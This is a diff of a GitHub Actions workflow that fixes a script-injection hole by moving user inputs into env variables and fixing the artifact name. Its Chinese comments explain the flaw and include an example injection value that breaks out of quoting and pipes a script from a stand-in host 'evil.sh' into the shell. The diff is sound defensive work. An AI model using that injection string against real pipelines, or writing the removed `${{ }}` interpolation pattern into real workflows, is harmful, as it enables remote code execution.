@@ -22,11 +22,25 @@ jobs:
       - uses: actions/checkout@v4
       - uses: astral-sh/setup-uv@v3
       - run: uv sync
-      - run: >
-          uv run geo-audit "${{ inputs.domain }}"
-          --contact "${{ inputs.contact }}"
-          --out out --format html
+      # ⚠️ 用户输入**必须先落到 env**，再在 shell 里用 "$VAR" 取。
+      #
+      # 原来写的是 `uv run geo-audit "${{ inputs.domain }}"` —— 那是 GitHub
+      # Actions 的脚本注入：`${{ }}` 由 Actions 在**生成 shell 脚本时**插值，
+      # 双引号根本挡不住。输入 `x"; curl evil.sh | sh; "` 就跳出了引号。
+      # 走 env 之后 shell 只看到一个变量名，插值发生在 shell 内部。
+      #
+      # 触发面确实窄（workflow_dispatch 要仓库写权限，有写权限的人本来就能改
+      # workflow）。但这个文件是给别人抄的「第二条路」，把注入模式发出去
+      # 比自己中招更糟。
+      - run: |
+          uv run geo-audit "$AUDIT_DOMAIN" --contact "$AUDIT_CONTACT" \
+            --out out --format html
+        env:
+          AUDIT_DOMAIN: ${{ inputs.domain }}
+          AUDIT_CONTACT: ${{ inputs.contact }}
       - uses: actions/upload-artifact@v4
         with:
-          name: report-${{ inputs.domain }}
+          # artifact 名也不许直接拼输入：名字里的 `/` 之类会让上传失败或写到
+          # 意外路径。固定名 + 报告文件自己带域名。
+          name: geo-audit-report
           path: out/
